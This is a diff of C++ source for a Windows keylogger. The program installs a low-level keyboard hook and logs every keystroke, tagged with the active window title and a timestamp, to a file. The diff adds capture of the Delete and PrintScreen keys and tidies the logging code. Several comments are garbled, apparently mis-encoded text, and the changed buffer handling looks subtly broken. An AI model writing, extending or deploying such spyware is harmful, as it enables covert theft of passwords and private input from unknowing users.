@@ -1,14 +1,15 @@
+#include<Windows.h>
+#include<iostream>
+#include<fstream>
 #include<time.h>
-#include"main.h"
+
 #pragma warning(disable:4996)
 #pragma warning(disable:4703)
-
 
 using namespace std;
 
 HHOOK hook;
 ofstream file;
-
 char previousProg[256];
 
 int Save(KBDLLHOOKSTRUCT kbData)
@@ -19,8 +20,6 @@ int Save(KBDLLHOOKSTRUCT kbData)
 	}
 
 	HWND foregroundW = GetForegroundWindow();
-	//DWORD pID;
-	//HKL kbLayout;
 
 	if (foregroundW) {
 		DWORD pID = GetWindowThreadProcessId(foregroundW, NULL);
@@ -29,16 +28,16 @@ int Save(KBDLLHOOKSTRUCT kbData)
 		char currentProg[256];
 		GetWindowTextA(foregroundW, currentProg, 256);
 		time_t time_ = time(NULL);
-		struct tm* tm = localtime(&time_);
-		char buffer[64];
+		//struct tm* tm = localtime(&time_);
+		//char timestamp_buff[64];
 		if (strcmp(previousProg, currentProg) != 0) {
 			strcpy_s(previousProg, currentProg);
-			strftime(buffer, sizeof(buffer), "%c", tm);
-			file << "[" << currentProg << "|" << buffer << "]\n";
+	/*		strftime(timestamp_buff, sizeof(timestamp_buff), "%c", tm);*/
+			file << "[" << currentProg << "|" << time_ << "]\n";
 		}
 
-		strftime(buffer, sizeof(buffer), "%H:%M:%S", tm);
-		file << buffer << "|";
+		//strftime(timestamp_buff, sizeof(timestamp_buff), "%H:%M:%S", tm);
+		file << time_ << "|";
 
 		switch (key)
 		{
@@ -50,6 +49,12 @@ int Save(KBDLLHOOKSTRUCT kbData)
 			break;
 		case VK_SPACE:
 			file << "[SPACE]" << endl;
+			break;
+		case VK_DELETE:
+			file << "[DELETE]" << endl;
+			break;
+		case VK_SNAPSHOT:
+			file << "[PRINTSCREEN]" << endl;
 			break;
 		case VK_SHIFT:
 		case VK_LSHIFT:
@@ -90,52 +95,17 @@ int Save(KBDLLHOOKSTRUCT kbData)
 			unsigned char keyboardState[256];
 			for (int i = 0; i < 256; ++i)
 				keyboardState[i] = static_cast<unsigned char>(GetKeyState(i));
-
-			wchar_t wbuffer[3] = { 0 };
-
-			int result = ToUnicodeEx(
-				key,
-				kbData.scanCode,
-				keyboardState,
-				wbuffer,
-				sizeof(wbuffer) / sizeof(wchar_t),
-				0, kbLayout);
-			if (result > 0)
-			{
-				char buffer[5] = { 0 };
-				WideCharToMultiByte(CP_ACP, 0, wbuffer, 1, buffer, sizeof(buffer) / sizeof(char), 0, 0);
+			wchar_t wbuffer; // convert virtual key to Unicode according keyboard layout
+			int result = ToUnicodeEx(key, kbData.scanCode, keyboardState, &wbuffer, sizeof(wbuffer)/sizeof(wchar_t), 0, kbLayout);
+			if (result > 0) {
+				char buffer[4] = { 0 }; // UTF-8 max 6-bytes
+				WideCharToMultiByte(CP_ACP, 0, &wbuffer, 1, buffer, sizeof(buffer) / sizeof(char), 0, 0); // Unicode to ANSI
+				cout << wbuffer << " => " << buffer << endl;
 				file << buffer << endl;
 			}
+			
 			break;
 		}
-
-		//if (key == VK_BACK) { file << "BACKSPACE"; }
-		//else if (key == VK_RETURN) { file << "\n"; }
-		//else if (key == VK_SPACE) { file << " "; }
-		//else if (key == VK_TAB) { file << "[TAB]"; }
-		//else if (key == VK_SHIFT || key == VK_LSHIFT) { file << "[SHIFT]"; }
-		//else if (key == VK_CONTROL || key == VK_LCONTROL) { file << "[CTRL]"; }
-		//else if (key == VK_ESCAPE) { file << "[ESC]"; }
-		//else if (key == VK_UP) { file << "[UP]"; }
-		//else if (key == VK_DOWN) { file << "[DOWN]"; }
-		//else if (key == VK_LEFT) { file << "[LEFT]"; }
-		//else if (key == VK_RIGHT) { file << "[RIGHT]"; }
-		//else if (key == 190 || key == 110) { file << "."; }
-		//else if (key == 189 || key == 109) { file << "-"; }
-		//else if (key == 20) { file << "[CAPS]"; }
-		//else {
-		//	char currentKey;
-		//	bool isLower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
-
-		//	if (((GetKeyState(VK_SHIFT) & 0x0001) != 0) ||
-		//		((GetKeyState(VK_LSHIFT) & 0x0001) != 0)) {
-		//		isLower = !isLower;ôûâôâûô
-		//	}â
-		//	currentKey = MapVirtualKeyExW(key, MAPVK_VK_TO_CHAR, kbLayout);
-		//	if (!isLower) {
-		//		currentKey = tolower(currentKey);
-		//	}
-		//	file << char(currentKey);
 	}
 	file.flush();
 	return 0;
@@ -146,19 +116,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 	if (nCode >= 0) {
 		if (wParam == WM_KEYDOWN) {
 			KBDLLHOOKSTRUCT kbData = *((KBDLLHOOKSTRUCT*)lParam);
-			//BYTE keystate[256];
-			//wchar_t bofchar[4];
-			//int chhBuff;
-			//cout << kbData.scanCode << endl;
-			//cout << kbData.dwExtraInfo << endl;
-			//cout << kbData.flags << endl;
-			//cout << kbData.time << endl;
-			//cout << kbData.vkCode << endl;
-			//GetKeyboardState((BYTE*)&keystate);
-			//ToUnicode(kbData.vkCode, kbData.scanCode, keystate, (LPTSTR)&bofchar, 4, 0);
-			////ToAscii(kbData.vkCode, kbData.scanCode, keystate, &bofchar, kbData.flags);
-			//cout << "s" << bofchar << endl;
-			//cout << endl << endl;
 			Save(kbData);
 		}
 	}
@@ -176,10 +133,11 @@ int main()
 	}
 
 	MSG msg;
-
-	for (;;) {
-		GetMessage(&msg, NULL, 0, 0);
-	}
+	// get messages from queue
+	while (GetMessage(&msg, NULL, 0, 0));
+	//for (;;) {
+	//	GetMessage(&msg, NULL, 0, 0);
+	//}
 }
 
-
+// ïðèâåògjrf ôâôâôadadûôâô
